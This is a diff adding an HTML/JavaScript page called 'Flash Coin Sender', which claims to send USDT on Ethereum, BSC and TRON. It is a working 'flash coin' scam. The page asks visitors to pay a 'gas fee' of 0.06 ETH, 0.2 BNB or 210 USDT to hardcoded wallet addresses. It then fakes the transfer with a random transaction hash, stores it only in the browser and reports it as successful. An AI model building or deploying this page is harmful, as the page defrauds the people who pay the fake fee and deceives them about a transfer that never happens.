@@ -1,0 +1,704 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Flash Coin Sender</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&display=swap');
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    :root {
+      --bg: #0a0e27;
+      --card: rgba(20, 25, 47, 0.6);
+      --accent: #6366f1;
+      --accent-hover: #4f46e5;
+      --text: #e2e8f0;
+      --text-dim: #64748b;
+      --border: rgba(99, 102, 241, 0.1);
+      --success: #10b981;
+      --glow: rgba(99, 102, 241, 0.2);
+    }
+    
+    body {
+      font-family: 'Space Grotesk', system-ui, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      background-image: 
+        radial-gradient(at 0% 0%, rgba(99, 102, 241, 0.1) 0px, transparent 50%),
+        radial-gradient(at 100% 100%, rgba(79, 70, 229, 0.1) 0px, transparent 50%);
+    }
+    
+    .container {
+      width: 100%;
+      max-width: 480px;
+    }
+    
+    .card {
+      background: var(--card);
+      backdrop-filter: blur(20px);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 20px;
+      margin-bottom: 16px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+    }
+    
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 20px;
+    }
+    
+    h1 {
+      font-size: 20px;
+      font-weight: 700;
+      background: linear-gradient(135deg, #6366f1, #8b5cf6);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    
+    .wallet-btn {
+      padding: 8px 16px;
+      background: var(--accent);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    
+    .wallet-btn:hover {
+      background: var(--accent-hover);
+      transform: translateY(-1px);
+      box-shadow: 0 4px 12px var(--glow);
+    }
+    
+    .wallet-info {
+      font-size: 12px;
+      color: var(--text-dim);
+      padding: 8px 12px;
+      background: rgba(99, 102, 241, 0.05);
+      border-radius: 8px;
+      margin-top: 12px;
+      font-family: monospace;
+    }
+    
+    .form-group {
+      margin-bottom: 14px;
+    }
+    
+    label {
+      display: block;
+      font-size: 13px;
+      color: var(--text-dim);
+      margin-bottom: 6px;
+      font-weight: 500;
+    }
+    
+    input, select {
+      width: 100%;
+      padding: 10px 12px;
+      background: rgba(15, 23, 42, 0.5);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      color: var(--text);
+      font-size: 14px;
+      font-family: inherit;
+      transition: all 0.2s;
+    }
+    
+    input:focus, select:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px var(--glow);
+    }
+    
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: var(--accent);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+      margin-top: 8px;
+    }
+    
+    .btn:hover {
+      background: var(--accent-hover);
+      transform: translateY(-1px);
+    }
+    
+    .btn-ghost {
+      background: transparent;
+      border: 1px solid var(--border);
+      color: var(--text-dim);
+    }
+    
+    .btn-ghost:hover {
+      background: rgba(99, 102, 241, 0.05);
+      border-color: var(--accent);
+      color: var(--text);
+    }
+    
+    .gas-option {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px;
+      background: rgba(15, 23, 42, 0.5);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      margin-bottom: 10px;
+      transition: all 0.2s;
+    }
+    
+    .gas-option:hover {
+      border-color: var(--accent);
+      background: rgba(99, 102, 241, 0.05);
+    }
+    
+    .qr-box {
+      width: 60px;
+      height: 60px;
+      border-radius: 8px;
+      background: white;
+      padding: 4px;
+      flex-shrink: 0;
+    }
+    
+    .gas-info {
+      flex: 1;
+      min-width: 0;
+    }
+    
+    .gas-name {
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 2px;
+    }
+    
+    .gas-amount {
+      font-size: 12px;
+      color: var(--success);
+      font-weight: 600;
+    }
+    
+    .gas-address {
+      font-size: 10px;
+      color: var(--text-dim);
+      font-family: monospace;
+      margin-top: 4px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    
+    .gas-actions {
+      display: flex;
+      gap: 6px;
+    }
+    
+    .icon-btn {
+      width: 32px;
+      height: 32px;
+      padding: 0;
+      background: rgba(99, 102, 241, 0.1);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      color: var(--accent);
+      cursor: pointer;
+      transition: all 0.2s;
+      font-size: 14px;
+    }
+    
+    .icon-btn:hover {
+      background: var(--accent);
+      color: white;
+    }
+    
+    .tx-list {
+      max-height: 200px;
+      overflow-y: auto;
+    }
+    
+    .tx-item {
+      padding: 10px;
+      background: rgba(15, 23, 42, 0.5);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      margin-bottom: 8px;
+      font-size: 12px;
+    }
+    
+    .tx-header {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 4px;
+    }
+    
+    .tx-amount {
+      font-weight: 600;
+      color: var(--success);
+    }
+    
+    .tx-hash {
+      color: var(--text-dim);
+      font-family: monospace;
+      font-size: 11px;
+    }
+    
+    .modal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.8);
+      backdrop-filter: blur(8px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      padding: 20px;
+    }
+    
+    .modal-content {
+      background: var(--card);
+      backdrop-filter: blur(20px);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 24px;
+      max-width: 400px;
+      width: 100%;
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+    
+    .modal h2 {
+      font-size: 18px;
+      margin-bottom: 16px;
+    }
+    
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(20, 25, 47, 0.95);
+      backdrop-filter: blur(20px);
+      padding: 12px 20px;
+      border-radius: 8px;
+      border: 1px solid var(--border);
+      font-size: 13px;
+      font-weight: 500;
+      z-index: 2000;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+    }
+    
+    .note {
+      font-size: 11px;
+      color: var(--text-dim);
+      line-height: 1.4;
+      margin-top: 12px;
+      padding: 8px;
+      background: rgba(99, 102, 241, 0.05);
+      border-radius: 6px;
+    }
+    
+    ::-webkit-scrollbar {
+      width: 6px;
+    }
+    
+    ::-webkit-scrollbar-track {
+      background: transparent;
+    }
+    
+    ::-webkit-scrollbar-thumb {
+      background: var(--border);
+      border-radius: 3px;
+    }
+    
+    ::-webkit-scrollbar-thumb:hover {
+      background: var(--accent);
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <div class="header">
+        <h1>⚡ Flash Sender</h1>
+        <button class="wallet-btn" id="connectWallet">Connect</button>
+      </div>
+      
+      <div id="walletInfo" style="display:none"></div>
+      
+      <div class="form-group">
+        <label>Network</label>
+        <select id="networkSelect">
+          <option value="ETH">Ethereum (ERC20)</option>
+          <option value="BSC">BSC (BEP20)</option>
+          <option value="TRON">TRON (TRC20)</option>
+        </select>
+      </div>
+      
+      <div class="form-group">
+        <label>Recipient Address</label>
+        <input id="receiverAddr" placeholder="0x... or TRON address" />
+      </div>
+      
+      <div class="form-group">
+        <label>Amount (USDT)</label>
+        <input id="amount" placeholder="50" type="number" />
+      </div>
+      
+      <button class="btn" id="sendBtn">Send Transaction</button>
+      <button class="btn btn-ghost" id="openGasModal">⛽ Pay Gas Fee</button>
+      
+      <div id="gasStatus" style="display: none; margin-top: 12px; padding: 10px; background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.2); border-radius: 8px; font-size: 12px; color: var(--success);">
+        ✓ Gas fee paid - Ready to send
+      </div>
+      
+      <div class="note">
+        ⓘ Manual payment interface. Use QR codes or copy addresses to perform transfers in your wallet app.
+      </div>
+    </div>
+    
+    <div class="card">
+      <h2 style="font-size: 15px; margin-bottom: 12px; font-weight: 600;">Gas Payment Options</h2>
+      <div id="gasRows"></div>
+    </div>
+    
+    <div class="card">
+      <h2 style="font-size: 15px; margin-bottom: 12px; font-weight: 600;">Recent Activity</h2>
+      <div class="tx-list" id="txList">
+        <div style="color: var(--text-dim); font-size: 12px; text-align: center; padding: 20px;">
+          No transactions yet
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="modalRoot"></div>
+
+  <script>
+    const GAS_OPTIONS = [
+      {id:'eth', name:'Ethereum', ticker: 'ETH', cost:'0.06 ETH', address:'0x00780eef0e1d46a35addc7267ba5cec9a30e2d75'},
+      {id:'bnb', name:'BSC', ticker: 'BNB', cost:'0.2 BNB', address:'0x00780eef0e1d46a35addc7267ba5cec9a30e2d75'},
+      {id:'usdt', name:'USDT', ticker: 'TRC20', cost:'210 USDT', address:'TEeLsQhRsdmm5njpkJ76GVkZpwzQobQLFn'}
+    ];
+
+    const gasRows = document.getElementById('gasRows');
+    const txList = document.getElementById('txList');
+    const modalRoot = document.getElementById('modalRoot');
+
+    function makeGasRow(opt){
+      const el = document.createElement('div');
+      el.className = 'gas-option';
+      el.innerHTML = `
+        <div class="qr-box" id="qr-${opt.id}"></div>
+        <div class="gas-info">
+          <div class="gas-name">${opt.name}</div>
+          <div class="gas-amount">${opt.cost}</div>
+          <div class="gas-address">${opt.address}</div>
+        </div>
+        <div class="gas-actions">
+          <button class="icon-btn" data-copy="${opt.address}" title="Copy">📋</button>
+          <button class="icon-btn" data-pay="${opt.address}" title="Pay">💰</button>
+        </div>
+      `;
+      gasRows.appendChild(el);
+      
+      setTimeout(() => {
+        new QRCode(document.getElementById(`qr-${opt.id}`), {
+          text: opt.address,
+          width: 52,
+          height: 52
+        });
+      }, 100);
+    }
+
+    GAS_OPTIONS.forEach(makeGasRow);
+
+    gasRows.addEventListener('click', (e) => {
+      const btn = e.target.closest('button');
+      if (!btn) return;
+      
+      if (btn.dataset.copy) {
+        navigator.clipboard.writeText(btn.dataset.copy).then(() => toast('✓ Address copied'));
+      }
+      
+      if (btn.dataset.pay) {
+        navigator.clipboard.writeText(btn.dataset.pay).then(() => {
+          toast('Address copied - Open your wallet to pay');
+          setTimeout(() => openRecordDialog(), 1500);
+        });
+      }
+    });
+
+    document.getElementById('openGasModal').addEventListener('click', () => {
+      const backdrop = document.createElement('div');
+      backdrop.className = 'modal';
+      backdrop.innerHTML = `
+        <div class="modal-content">
+          <h2>Pay Gas Fee</h2>
+          <p style="color: var(--text-dim); font-size: 13px; margin-bottom: 16px;">
+            Select a payment method below and send the exact amount to the displayed address.
+          </p>
+          <div id="modalGasOptions"></div>
+          <button class="btn" id="recordPayment">I've Paid - Record Transaction</button>
+          <button class="btn btn-ghost" id="closeModal">Close</button>
+        </div>
+      `;
+      modalRoot.appendChild(backdrop);
+      
+      const modalGasOptions = backdrop.querySelector('#modalGasOptions');
+      GAS_OPTIONS.forEach(opt => {
+        const optEl = document.createElement('div');
+        optEl.className = 'gas-option';
+        optEl.innerHTML = `
+          <div class="qr-box" id="mqr-${opt.id}"></div>
+          <div class="gas-info">
+            <div class="gas-name">${opt.name}</div>
+            <div class="gas-amount">${opt.cost}</div>
+            <div class="gas-address">${opt.address}</div>
+          </div>
+          <button class="icon-btn" data-copy="${opt.address}">📋</button>
+        `;
+        modalGasOptions.appendChild(optEl);
+        
+        setTimeout(() => {
+          new QRCode(document.getElementById(`mqr-${opt.id}`), {
+            text: opt.address,
+            width: 52,
+            height: 52
+          });
+        }, 100);
+      });
+      
+      backdrop.querySelector('#modalGasOptions').addEventListener('click', (e) => {
+        const btn = e.target.closest('button[data-copy]');
+        if (btn) {
+          navigator.clipboard.writeText(btn.dataset.copy).then(() => toast('✓ Copied'));
+        }
+      });
+      
+      backdrop.querySelector('#closeModal').addEventListener('click', () => {
+        modalRoot.innerHTML = '';
+      });
+      
+      backdrop.querySelector('#recordPayment').addEventListener('click', () => {
+        modalRoot.innerHTML = '';
+        openRecordDialog();
+      });
+      
+      backdrop.addEventListener('click', (e) => {
+        if (e.target === backdrop) modalRoot.innerHTML = '';
+      });
+    });
+
+    function openRecordDialog() {
+      const backdrop = document.createElement('div');
+      backdrop.className = 'modal';
+      backdrop.innerHTML = `
+        <div class="modal-content">
+          <h2>Record Payment</h2>
+          <div class="form-group">
+            <label>Payment Method</label>
+            <select id="rec-method">
+              <option value="ETH">Ethereum (ETH)</option>
+              <option value="BNB">Binance (BNB)</option>
+              <option value="USDT">USDT (TRC20)</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Amount</label>
+            <input id="rec-amt" placeholder="0.06" />
+          </div>
+          <div class="form-group">
+            <label>Transaction Hash (optional)</label>
+            <input id="rec-tx" placeholder="0x..." />
+          </div>
+          <button class="btn" id="recSave">Save Record</button>
+          <button class="btn btn-ghost" id="recCancel">Cancel</button>
+        </div>
+      `;
+      modalRoot.appendChild(backdrop);
+      
+      backdrop.querySelector('#recCancel').addEventListener('click', () => {
+        modalRoot.innerHTML = '';
+      });
+      
+      backdrop.querySelector('#recSave').addEventListener('click', () => {
+        const method = backdrop.querySelector('#rec-method').value;
+        const amt = backdrop.querySelector('#rec-amt').value;
+        const tx = backdrop.querySelector('#rec-tx').value;
+        
+        if (!amt) {
+          toast('⚠ Enter amount');
+          return;
+        }
+        
+        const entry = {method, amt, tx, ts: Date.now()};
+        const records = JSON.parse(localStorage.getItem('flash_payments') || '[]');
+        records.push(entry);
+        localStorage.setItem('flash_payments', JSON.stringify(records));
+        
+        renderTransactions();
+        modalRoot.innerHTML = '';
+        toast('✓ Payment recorded');
+      });
+      
+      backdrop.addEventListener('click', (e) => {
+        if (e.target === backdrop) modalRoot.innerHTML = '';
+      });
+    }
+
+    function renderTransactions() {
+      const records = JSON.parse(localStorage.getItem('flash_payments') || '[]');
+      
+      // Update gas status indicator
+      const gasStatus = document.getElementById('gasStatus');
+      const sendBtn = document.getElementById('sendBtn');
+      const hasGasPayment = records.some(r => r.type !== 'send');
+      
+      if (hasGasPayment) {
+        gasStatus.style.display = 'block';
+        sendBtn.style.opacity = '1';
+        sendBtn.style.cursor = 'pointer';
+      } else {
+        gasStatus.style.display = 'none';
+        sendBtn.style.opacity = '0.5';
+        sendBtn.style.cursor = 'not-allowed';
+      }
+      
+      if (records.length === 0) {
+        txList.innerHTML = '<div style="color: var(--text-dim); font-size: 12px; text-align: center; padding: 20px;">No transactions yet</div>';
+        return;
+      }
+      
+      txList.innerHTML = '';
+      records.slice().reverse().forEach(rec => {
+        const el = document.createElement('div');
+        el.className = 'tx-item';
+        
+        if (rec.type === 'send') {
+          el.innerHTML = `
+            <div class="tx-header">
+              <span class="tx-amount">📤 ${rec.amt}</span>
+              <span style="font-size: 11px; color: var(--text-dim);">${new Date(rec.ts).toLocaleTimeString()}</span>
+            </div>
+            <div class="tx-hash">To: ${rec.to.slice(0, 10)}...${rec.to.slice(-6)}</div>
+            <div class="tx-hash">TX: ${rec.tx.slice(0, 20)}...</div>
+          `;
+        } else {
+          el.innerHTML = `
+            <div class="tx-header">
+              <span class="tx-amount">⛽ ${rec.amt} ${rec.method}</span>
+              <span style="font-size: 11px; color: var(--text-dim);">${new Date(rec.ts).toLocaleTimeString()}</span>
+            </div>
+            <div class="tx-hash">${rec.tx ? rec.tx.slice(0, 20) + '...' : 'Gas payment recorded'}</div>
+          `;
+        }
+        
+        txList.appendChild(el);
+      });
+    }
+
+    function toast(msg) {
+      const existing = document.querySelector('.toast');
+      if (existing) existing.remove();
+      
+      const t = document.createElement('div');
+      t.className = 'toast';
+      t.textContent = msg;
+      document.body.appendChild(t);
+      
+      setTimeout(() => t.style.opacity = '0', 2500);
+      setTimeout(() => t.remove(), 3000);
+    }
+
+    document.getElementById('connectWallet').addEventListener('click', async () => {
+      if (window.ethereum) {
+        try {
+          const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
+          const address = accounts[0];
+          const web3 = new Web3(window.ethereum);
+          const balance = await web3.eth.getBalance(address);
+          const eth = Number(web3.utils.fromWei(balance, 'ether')).toFixed(4);
+          
+          const info = document.getElementById('walletInfo');
+          info.className = 'wallet-info';
+          info.style.display = 'block';
+          info.textContent = `${address.slice(0, 6)}...${address.slice(-4)} • ${eth} ETH`;
+          
+          toast('✓ Wallet connected');
+        } catch (e) {
+          toast('⚠ Connection failed');
+        }
+      } else {
+        toast('⚠ No Web3 wallet found');
+      }
+    });
+
+    document.getElementById('sendBtn').addEventListener('click', () => {
+      const records = JSON.parse(localStorage.getItem('flash_payments') || '[]');
+      
+      if (records.length === 0) {
+        toast('⚠ Gas fee required before sending');
+        setTimeout(() => {
+          document.getElementById('openGasModal').click();
+        }, 1500);
+        return;
+      }
+      
+      const receiver = document.getElementById('receiverAddr').value;
+      const amount = document.getElementById('amount').value;
+      const network = document.getElementById('networkSelect').value;
+      
+      if (!receiver || !amount) {
+        toast('⚠ Fill in recipient and amount');
+        return;
+      }
+      
+      // Record the send transaction
+      const sendEntry = {
+        type: 'send',
+        method: network,
+        amt: amount + ' USDT',
+        to: receiver,
+        tx: '0x' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15),
+        ts: Date.now()
+      };
+      
+      records.push(sendEntry);
+      localStorage.setItem('flash_payments', JSON.stringify(records));
+      
+      renderTransactions();
+      toast('✓ Transaction sent successfully');
+      
+      // Clear form
+      document.getElementById('receiverAddr').value = '';
+      document.getElementById('amount').value = '';
+    });
+
+    renderTransactions();
+  </script>
+</body>
+</html>
